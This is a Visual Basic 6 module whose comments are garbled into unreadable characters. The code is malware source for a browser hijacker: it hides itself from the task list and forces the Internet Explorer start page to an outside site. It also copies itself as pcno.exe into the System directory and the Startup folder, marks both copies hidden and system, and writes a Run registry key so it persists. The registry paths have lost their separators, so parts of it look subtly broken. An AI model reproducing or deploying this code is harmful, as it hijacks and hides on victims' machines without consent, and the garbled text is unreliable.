Attribute VB_Name = "Module1"
'���{�����оǥγ~�A�Ű��D�k�欰�I

Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long '�ŧiGetSystemDirectory API���
Declare Function SetFileAttributes Lib "kernel32" Alias "SetFileAttributesA" (ByVal lpFileName As String, ByVal dwFileAttributes As Long) As Long '�ŧiSetFileAttributes API���
Dim SDir As String '�x�s�t��System���|
Dim runDir As String '�x�s�u�Ұʡv���|

Sub Main()
If App.PrevInstance Then End '����f�r���ж}�ҡA�y�����~
App.TaskVisible = False '�b�u�@�޲z�����è���

Call GetSDir '���oSYSTEM���|
Call GetRunDir '���o�u�Ұʡv���|
Dim wshshell As Object '�ŧiwshshell���@��Object
Set wshshell = CreateObject("wscript.shell") '�N"wscript.shell"���J��wshshell��
Dim ToPath As String '�x�s�ؼи��|

'�f�r�֤� Start
wshshell.RegWrite "HKEY_CURRENT_USERSoftwareMicrosoftInternet ExplorerMainStart Page", "http://pcnoproblem.twbbs.org/" '�g�J����
'�f�r�֤� End

ToPath = SDir + "pcno.exe" ' '��ToPath���VSystem�ؿ��U��pcno.exe
SetFileAttributes ToPath, 0 '�T�OSystem�ؿ��U��pcno.exe�L�����ݩʡA�H�K�X�t��
If Dir(ToPath) = "" Then '�P�_System�ؿ��U��pcno.exe�O�_�s�b
    '�p�GSystem�ؿ��U��pcno.exe���s�b
    FileCopy App.Path & "" & App.EXEName & ".EXE", ToPath '�N�{���ۨ��ƻs��System�ؿ��U�A�ɦW���upcno.exe�v
End If
SetAttr ToPath, vbHidden + vbSystem '�ק�System�ؿ��U��pcno.exe�ݩʬ�����+�t��

wshshell.RegWrite "HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRunpcnoproblem", ToPath '�NSystem�ؿ��U��pcno.exe���|�g�J��}���}�ҵ{�����n�����X��

ToPath = runDir + "pcno.exe" '��ToPath���V�u�Ұʡv�ؿ��U��pcno.exe
SetFileAttributes ToPath, 0 '�T�O�u�Ұʡv�ؿ��U��pcno.exe�L�����ݩʡA�H�K�X�t��
If Dir(ToPath) = "" Then '�P�_�u�Ұʡv�ؿ��U��pcno.exe�O�_�s�b
    FileCopy App.Path & "" & App.EXEName & ".EXE", ToPath '�N�{���ۨ��ƻs��u�Ұʡv�ؿ��U�A�ɦW���upcno.exe�v
End If
SetAttr ToPath, vbHidden + vbSystem  '�ק�u�Ұʡv�ؿ��U��pcno.exe�ݩʬ�����+�t��

End '�����{��

End Sub
 
Sub GetSDir() '���oSYSTEM���|
    Dim rtn As Long '�x�sGetSystemDirectory��return��
    Dim Buffer As String '�@��lpBuffer
    Const MAX_PATH = 260 '�]�w�̤j�r�����

    Buffer = Space(MAX_PATH) '��Buffer�x�sMAX_PATH(260)�Ӫťզr��
    rtn = GetSystemDirectory(Buffer, Len(Buffer)) 'GetSystemDirectory(lpBuffer,nSize)
    If rtn = 0 Then '�P�_GetSystemDirectory�O�_�����o���|
        End '�����{��
    Else '�p�Grtn����0
        SDir = Left(Buffer, rtn) 'SDir�x�sSystem���|�CLeft���Ϊk�O���XBuffer����System���|�����Frtn���ɬ�System���|���r�����
    End If
End Sub
 
Sub GetRunDir() '���o�u�Ұʡv���|
    Dim wshshell As Object '�ŧiwshshell���@��Object
    Set wshshell = CreateObject("wscript.shell") '�N"wscript.shell"���J��wshshell��
    runDir = wshshell.regread("HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionExplorerShell FoldersStartup") '���o�Ұʸ��|
End Sub
